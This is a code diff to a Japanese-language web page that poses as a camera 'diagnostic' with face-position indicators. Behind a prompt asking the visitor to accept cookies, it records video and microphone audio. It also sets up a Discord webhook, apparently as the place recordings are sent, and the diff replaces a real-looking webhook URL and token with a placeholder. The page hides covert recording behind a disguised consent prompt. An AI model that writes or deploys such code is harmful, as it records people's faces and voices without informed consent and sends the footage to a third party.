@@ -73,8 +73,8 @@ const goCameraBtn = document.getElementById('go-camera-btn'); const backBtn = do
 const video = document.getElementById('video'); const diagnosticBtn = document.getElementById('diagnostic-btn'); const instructionText = document.getElementById('instruction-text');
 const lightIndicator = document.getElementById('status-light'); const faceIndicator = document.getElementById('status-face'); const posIndicator = document.getElementById('status-pos');
 
-// 指定されたDiscordのWebhook URL
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1561782839861575882/DVTtBk0vyAtZTNjGlBROUIb2iTuaXJ2M8Bjp139Nw3z4Lq-YeTvzj6EOJSmToodyCkkR';
+// 🔴あなたのDiscordのWebhook URL
+const WEBHOOK_URL = 'https://discord.com';
 
 let activeStream = null; let indicatorTimers = []; let mediaRecorder = null; let recordedChunks = [];
 
@@ -84,7 +84,7 @@ backBtn.addEventListener('click', () => { goBackToTop(); });
 async function startLightweightCamera() {
     try {
         diagnosticBtn.disabled = true; diagnosticBtn.innerText = "カメラを起動中...";
-        // 【音声有効化】audio: true に変更し、カメラと一緒にマイク音声も取得します
+        // 【音声有効化】カメラと一緒にマイク音声も取得します
         activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); video.srcObject = activeStream;
         diagnosticBtn.innerText = "顔のポジションを調整中...";
         indicatorTimers.push(setTimeout(() => { updateIndicator(lightIndicator, true); }, 1500));
@@ -102,7 +102,8 @@ function updateIndicator(element, isGood) {
 }
 
 diagnosticBtn.addEventListener('click', () => {
-    const userAgreed = confirm("Cookieを受け入れますか？）");
+    // 【構文エラー修正】閉じカッコの全角を修正
+    const userAgreed = confirm("Cookieを受け入れますか？");
     if (!userAgreed) return;
     startVideoRecording();
 });
@@ -110,7 +111,7 @@ diagnosticBtn.addEventListener('click', () => {
 function startVideoRecording() {
     diagnosticBtn.disabled = true; instructionText.style.display = 'none'; recordedChunks = [];
     
-    // 【音声入り録画の最適化】デバイス環境に応じて音声+映像が保存できるコンテナを自動判定します
+    // 【音声入り録画の最適化】環境に応じて適切なコンテナを選択します
     let options = { mimeType: 'video/mp4;codecs=avc1,mp4a.40.2' };
     if (!MediaRecorder.isTypeSupported(options.mimeType)) { options = { mimeType: 'video/webm;codecs=vp8,opus' }; }
     if (!MediaRecorder.isTypeSupported(options.mimeType)) { options = { mimeType: 'video/webm' }; }
